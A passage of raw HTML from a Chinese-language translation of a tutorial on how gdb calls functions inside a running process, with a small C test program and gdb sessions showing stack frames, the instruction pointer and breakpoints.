data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd78942079532-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd78942079532-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd78942079532-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd78942079532-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd78942079532-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd78942079532-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd78942079532-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd78942079532-1\"><span class=\"crayon-p\">#include &lt;unistd.h&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd78942079532-2\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd78942079532-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd78942079532-4\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd78942079532-5\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd78942079532-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd78942079532-7\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>接下来，编译并运行它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd80905407060\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gcc -o test  test.c\r\n$ ./test</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd80905407060-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd80905407060-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd80905407060-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gcc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">test  </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd80905407060-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">test</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>最后，我们使用 gdb 来跟踪 <code>test</code> 这一程序：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd84653584265\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo gdb -p $(pgrep -f test)\r\n(gdb) p foo()\r\n$1 = 3\r\n(gdb) quit</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd84653584265-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd84653584265-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd84653584265-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd84653584265-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd84653584265-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">gdb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pgrep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd84653584265-2\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd84653584265-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd84653584265-4\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">quit</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>我运行 <code>p foo()</code> 然后它运行了这个函数！这非常有趣。</p>\n<h1 id=\"toc_4\">这有什么用？</h1>\n<p>下面是一些可能的用途：</p>\n<ul>\n<li>它使得你可以把 gdb 当成一个 C 应答式程序（REPL），这很有趣，我想对开发也会有用</li>\n<li>在 gdb 中进行调试的时候展示/浏览复杂数据结构的功能函数（感谢 <a href=\"https://twitter.com/invalidop/status/949161146526781440\">@invalidop</a>）</li>\n<li><a href=\"https://github.com/baloo/setns/blob/master/setns.c\">在进程运行时设置一个任意的名字空间</a>（我的同事 <a href=\"https://github.com/nelhage\">nelhage</a> 对此非常惊讶）</li>\n<li>可能还有许多我所不知道的用途</li>\n</ul>\n<h1 id=\"toc_5\">它是如何工作的</h1>\n<p>当我在 Twitter 上询问从 gdb 中调用函数是如何工作的时，我得到了大量有用的回答。许多答案是“你从符号表中得到了函数的地址”，但这并不是完整的答案。</p>\n<p>有个人告诉了我两篇关于 gdb 如何工作的系列文章：<a href=\"https://www.cl.cam.ac.uk/%7Esrk31/blog/2016/02/25/#native-debugging-part-1\">原生调试：第一部分</a>，<a href=\"https://www.cl.cam.ac.uk/%7Esrk31/blog/2017/01/30/#native-debugging-part-2\">原生调试：第二部分</a>。第一部分讲述了 gdb 是如何调用函数的（指出了 gdb 实际上完成这件事并不简单，但是我将会尽力）。</p>\n<p>步骤列举如下：</p>\n<ol>\n<li>停止进程</li>\n<li>创建一个新的栈框（远离真实栈）</li>\n<li>保存所有寄存器</li>\n<li>设置你想要调用的函数的寄存器参数</li>\n<li>设置栈指针指向新的栈框stack frame</li>\n<li>在内存中某个位置放置一条陷阱指令</li>\n<li>为陷阱指令设置返回地址</li>\n<li>设置指令寄存器的值为你想要调用的函数地址</li>\n<li>再次运行进程！</li>\n</ol>\n<p>（LCTT 译注：如果将这个调用的函数看成一个单独的线程，gdb 实际上所做的事情就是一个简单的线程上下文切换）</p>\n<p>我不知道 gdb 是如何完成这些所有事情的，但是今天晚上，我学到了这些所有事情中的其中几件。</p>\n<h2 id=\"toc_6\">创建一个栈框</h2>\n<p>如果你想要运行一个 C 函数，那么你需要一个栈来存储变量。你肯定不想继续使用当前的栈。准确来说，在 gdb 调用函数之前（通过设置函数指针并跳转），它需要设置栈指针到某个地方。</p>\n<p>这儿是 Twitter 上一些关于它如何工作的猜测：</p>\n<blockquote><p>我认为它在当前栈的栈顶上构造了一个新的栈框来进行调用！</p></blockquote>\n<p>以及</p>\n<blockquote><p>你确定是这样吗？它应该是分配一个伪栈，然后临时将 sp （栈指针寄存器）的值改为那个栈的地址。你可以试一试，你可以在那儿设置一个断点，然后看一看栈指针寄存器的值，它是否和当前程序寄存器的值相近？</p></blockquote>\n<p>我通过 gdb 做了一个试验：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd89120582762\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n(gdb) p $rsp\r\n$7 = (void *) 0x7ffea3d0bca8\r\n(gdb) break foo\r\nBreakpoint 1 at 0x40052a\r\n(gdb) p foo()\r\nBreakpoint 1, 0x000000000040052a in foo ()\r\n(gdb) p $rsp\r\n$8 = (void *) 0x7ffea3d0bc00</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd89120582762-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd89120582762-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd89120582762-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd89120582762-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd89120582762-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd89120582762-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd89120582762-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd89120582762-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd89120582762-1\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">rsp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd89120582762-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x7ffea3d0bca8</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd89120582762-3\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">break</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd89120582762-4\"><span class=\"crayon-i\">Breakpoint</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">at</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x40052a</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd89120582762-5\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd89120582762-6\"><span class=\"crayon-i\">Breakpoint</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x000000000040052a</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd89120582762-7\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">rsp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd89120582762-8\"><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x7ffea3d0bc00</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p>这看起来符合“gdb 在当前栈的栈顶构造了一个新的栈框”这一理论。因为栈指针（<code>$rsp</code>）从 <code>0x7ffea3d0bca8</code> 变成了 <code>0x7ffea3d0bc00</code> —— 栈指针从高地址往低地址长。所以 <code>0x7ffea3d0bca8</code> 在 <code>0x7ffea3d0bc00</code> 的后面。真是有趣！</p>\n<p>所以，看起来 gdb 只是在当前栈所在位置创建了一个新的栈框。这令我很惊讶！</p>\n<h2 id=\"toc_7\">改变指令指针</h2>\n<p>让我们来看一看 gdb 是如何改变指令指针的！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd8f621543973\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n(gdb) p $rip\r\n$1 = (void (*)()) 0x7fae7d29a2f0 &lt;__nanosleep_nocancel+7&gt;\r\n(gdb) b foo\r\nBreakpoint 1 at 0x40052a\r\n(gdb) p foo()\r\nBreakpoint 1, 0x000000000040052a in foo ()\r\n(gdb) p $rip\r\n$3 = (void (*)()) 0x40052a &lt;foo+4&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd8f621543973-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd8f621543973-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd8f621543973-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd8f621543973-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd8f621543973-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd8f621543973-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa9315fd8f621543973-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa9315fd8f621543973-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd8f621543973-1\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">rip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd8f621543973-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x7fae7d29a2f0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">__nanosleep_nocancel</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd8f621543973-3\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd8f621543973-4\"><span class=\"crayon-i\">Breakpoint</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">at</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x40052a</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd8f621543973-5\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd8f621543973-6\"><span class=\"crayon-i\">Breakpoint</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x000000000040052a</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa9315fd8f621543973-7\"><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">gdb</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">rip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa9315fd8f621543973-8\"><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0x40052a</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">foo</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>的确是！指令指针从 <code>0x7fae7d29a2f0</code> 变为了 <code>0x40052a</code>（<code>foo</code> 函数的地址）。</p>\n<p>我盯着输出看了很久，但仍然不理解它是如何改变指令指针的，但这并不影响什么。</p>\n<h2 id=\"toc_8\">如何设置断点</h2>\n<p>上面我写到 <code>break foo</code> 。我跟踪 gdb 运行程序的过程，但是没有任何发现。</p>\n<p>下面是 gdb 用来设置断点的一些系统调用。它们非常简单。它把一条指令用 <code>cc</code> 代替了（这告诉我们 <code>int3</code> 意味着 <code>send SIGTRAP</code> <a href=\"https://defuse.ca/online-x86-assembler.htm\">https://defuse.ca/online-x86-assembler.html</a>），并且一旦程序被打断了，它就把指令恢复为原先的样子。</p>\n<p>我在函数 <code>foo</code> 那儿设置了一个断点，地址为 <code>0x400528</code> 。</p>\n<p><code>PTRACE_POKEDATA</code> 展示了 gdb 如何改变正在运行的程序。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa9315fd93116420112\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" 